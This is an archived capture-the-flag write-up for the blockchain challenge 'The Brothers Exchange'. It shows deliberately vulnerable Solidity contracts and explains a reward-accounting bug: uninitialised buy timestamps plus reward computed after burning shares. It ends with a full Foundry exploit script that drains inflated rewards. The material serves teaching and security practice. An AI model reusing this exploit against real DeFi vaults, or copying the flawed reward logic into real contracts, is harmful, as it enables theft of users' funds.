# The_Brothers_Exchange

**CTF:** TheCyberJawaraInternational 2024  
**Category:** blockchain  
**Original writeup:** <https://medium.com/@firdausfarul/cyber-jawara-international-2024-blockchain-challenge-writeup-eb11a4711923> — by **firdausfarul**. All credit goes to the original author; this is an archived copy.

---

The Brothers Exchange

We’re give 1.1 ether and this setup contract.

contract Setup {

BudiExchange public budiExchange;

GoodCoin public goodCoin;

WicaksonoETF public wicaksonoETF;



address player;



constructor() payable {

goodCoin = new GoodCoin();

wicaksonoETF = new WicaksonoETF();

budiExchange = new BudiExchange(address(goodCoin), address(wicaksonoETF));



// Mint some initial GoodCoin for the BudiExchange

goodCoin.mint(address(budiExchange), 2 ether);



// Fund some initial reward for WicaksonoETF

wicaksonoETF.fundReward{value: 10 ether}();

}



function setPlayer() external {

require(player == address(0), "Player has been set");

player = msg.sender;

}



function isSolved() external view returns (bool) {

return goodCoin.balanceOf(player) >= 0.98 ether && player.balance >= 0.98 ether;

}

}

There is 2 ERC20 coin, GoodCoin is just a basic ERC20, and Wicaksono ETF is like a wrapper token around a vault. BudiExchange is an exchange contract for GoodCoin and WicaksonoETF. The Setup contract mint GoodCoin directly to the exchange contract and then fundReward on wicaksonoETF with the amount of 10 ether. We get the flag when the player (us) ETH balance is more than 0.98 and GoodCoin balance is more than 0.98 too. Now lets dive into the BudiExchange contract

contract BudiExchange is Ownable {

GoodCoin public goodCoin;

WicaksonoETF public wicaksonoETF;



uint256 public exchangeFeePercentage = 5; // 0.5% fee

uint256 public constant FEE_DENOMINATOR = 1000;



mapping(address => uint256) public lastExchangeTimestamp;

uint256 public exchangeCooldown = 1 hours;



event ExchangeCompleted(address indexed user, uint256 sharesAmount, uint256 foreignAmount);

event FeeUpdated(uint256 newFeePercentage);

event CooldownUpdated(uint256 newCooldown);



constructor(address _goodCoin, address _wicaksonoETF) Ownable(msg.sender) {

goodCoin = GoodCoin(_goodCoin);

wicaksonoETF = WicaksonoETF(_wicaksonoETF);

}



function exchangeSharesForForeign(uint256 shareAmount) external {

require(lastExchangeTimestamp[msg.sender] == 0 || block.timestamp >= lastExchangeTimestamp[msg.sender] + exchangeCooldown, "Exchange cooldown not met");

require(wicaksonoETF.transferFrom(msg.sender, address(this), shareAmount), "Transfer failed");



uint256 sharePrice = wicaksonoETF.getSharePrice();

uint256 foreignAmount = (shareAmount * sharePrice) / 1e18;



uint256 fee = (foreignAmount * exchangeFeePercentage) / FEE_DENOMINATOR;

uint256 amountAfterFee = foreignAmount - fee;



require(goodCoin.transfer(msg.sender, amountAfterFee), "Foreign currency transfer failed");



lastExchangeTimestamp[msg.sender] = block.timestamp;

emit ExchangeCompleted(msg.sender, shareAmount, amountAfterFee);

}



function setExchangeFee(uint256 _newFeePercentage) external onlyOwner {

require(_newFeePercentage <= 50, "Fee too high"); // Max 5% fee

exchangeFeePercentage = _newFeePercentage;

emit FeeUpdated(_newFeePercentage);

}



function setExchangeCooldown(uint256 _newCooldown) external onlyOwner {

exchangeCooldown = _newCooldown;

emit CooldownUpdated(_newCooldown);

}



function withdrawFees() external onlyOwner {

uint256 balance = goodCoin.balanceOf(address(this));

require(balance > 0, "No fees to withdraw");

require(goodCoin.transfer(owner(), balance), "Fee withdrawal failed");

}

}

We can’t call method with onlyOwner modifier, so we should only care for exchangeSharesForForeign() method. The method checks the cooldown and then transfer the token from caller to contract. The exchange contract then call the ETF contract for a price and then calculate the amount needed based on that price, and then send the corresponding amount of goodcoin to msg.sender. Now we need to visit the ETF contract.



contract WicaksonoETF is ERC20, ReentrancyGuard, Ownable {

uint256 public amountManaged;

uint256 public feeReceived;

uint256 public constant FEE_PERCENTAGE = 1; // 1% fee

uint256 public totalReward;

mapping(address => uint256) public lastBuyTimestamp;



constructor() ERC20("WicaksonoETF", "WETF", 18) Ownable(msg.sender) {}



function buyShares() external payable {

require(msg.value > 0, "Must send ETH to buy shares");



uint256 fee = (msg.value * FEE_PERCENTAGE) / 100;

uint256 amountAfterFee = msg.value - fee;



feeReceived += fee;

amountManaged += amountAfterFee;



uint256 sharesToMint = calculateShares(amountAfterFee);

_mint(msg.sender, sharesToMint);

lastBuyTimestamp[msg.sender] = block.timestamp;

}



function withdrawShares(uint256 amount) external nonReentrant {

require(amount > 0, "Amount must be greater than 0");

require(balanceOf[msg.sender] >= amount, "Insufficient balance");

uint256 ethToReturn = (amount * amountManaged) / totalSupply;

_burn(msg.sender, amount);



uint256 reward = 0;

if (block.timestamp >= lastBuyTimestamp[msg.sender] + 10 weeks) {

reward = (totalReward * amount) / totalSupply;

totalReward -= reward;

}



(bool success, ) = msg.sender.call{value: ethToReturn + reward}("");

require(success, "ETH transfer failed");

amountManaged -= ethToReturn;

}



function calculateShares(uint256 amount) public view returns (uint256) {

if (totalSupply == 0) {

return amount;

}

return (amount * totalSupply) / amountManaged;

}



function getSharePrice() public view returns (uint256) {

if (totalSupply == 0) {

return 1 ether;

}

return (amountManaged * 1e18) / totalSupply;

}



function fundReward() external payable onlyOwner {

require(msg.value > 0, "Must send ETH to fund reward");

totalReward += msg.value;

}

}

fundReward() method only add the totalReward variable. buyShare substract the fee and then mint the token based on (amount * totalSupply) / amountManaged, pretty normal. Looking at the withdrawShares(), we can notice that to get the bonus, current timestamp is more than lastBuyTimestamp[msg.sender] + 10 weeks. If the withdrawee never bought any share and withdraw his money, lastBuyTimestamp[msg.sender] will be zero, since it is uninitialized. So if a user receive the share from other person and withdraw, he will always get the bonus. Also notice that the bonus amount is calculated based on the after burn totalSupply.

We can deposit ~1.1 ether to get Shares first, after it we can exchange ~0.99 share for the good token to fulfill that requirement first. We are left with ~0.1 share, we can transfer that to a new address and then withdraw the share from the new address to get the bonus. The bonus we got will be around 1 eth ((10 ether init bonus * 0.1 amountWithdrawn) / 1 eth totalsupply afterburn). which is enough for the isSolved constraint. For detailed POC, refer to the script below.

Here is the foundry script of the solution.

contract Solve is Script {



function setUp() public {



}



function run() public {

uint256 privateKey = 0x73ade600fc8f7e758f7c6b8ec1e4dceea13a8c8675ed6bc74e017202550d3cb1;

vm.startBroadcast(privateKey);

//BSE 4-0

address haxxor = vm.addr(0x40);

address challAddress = 0x0A4A0041d16bf89D1674Ecc48f46A803fE51DdE9;

Setup chall = Setup(challAddress);



GoodCoin goodCoin = GoodCoin(chall.goodCoin());

WicaksonoETF wicaksonoETF = WicaksonoETF(chall.wicaksonoETF());

BudiExchange budiExchange = BudiExchange(chall.budiExchange());



//buy shares (leave 0.01 for tx fee)

wicaksonoETF.buyShares{value: 1.09 ether}();

//approve etf to budi

wicaksonoETF.approve(address(budiExchange), 10000 ether);

//exchange shares for good token

budiExchange.exchangeSharesForForeign(0.99 ether);

//get ~0.98 good token



//exploit the vulnerability in wicaksonoETF

//transfer 0.1 share to haxxor

wicaksonoETF.transfer(haxxor, 0.09 ether);



//transfer good to haxxor

goodCoin.transfer(haxxor, 0.98 ether);

//for haxxor gas

payable(haxxor).transfer(0.0005 ether);



vm.stopBroadcast();



//haxxxor tx

vm.startBroadcast(0x40);

//withdraw share

wicaksonoETF.withdrawShares(0.09 ether);

//due to bug returns ~1 ether



//init player

chall.setPlayer();

require(chall.isSolved());

vm.stopBroadcast();
